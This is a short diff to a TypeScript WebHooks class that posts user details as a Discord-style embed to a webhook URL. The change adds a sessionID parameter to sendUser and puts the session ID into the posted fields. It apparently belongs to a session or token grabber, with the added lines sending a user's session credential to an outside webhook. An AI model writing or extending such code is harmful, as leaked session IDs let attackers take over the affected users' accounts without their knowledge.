@@ -48,7 +48,7 @@ export default class WebHooks {
     axios.post(this.url, jsonToSend, { headers: { "content-type": "application/json" } }).catch((err) => console.log("err: ", err.response.data));
   };
 
-  sendUser = () => {
+  sendUser = (sessionID: string) => {
     const body = {
       content: null,
       embeds: [
@@ -67,6 +67,10 @@ export default class WebHooks {
             {
               name: "Verified",
               value: this.user?.verified,
+            },
+            {
+              name: "Session ID",
+              value: sessionID,
             },
           ],
           author: {
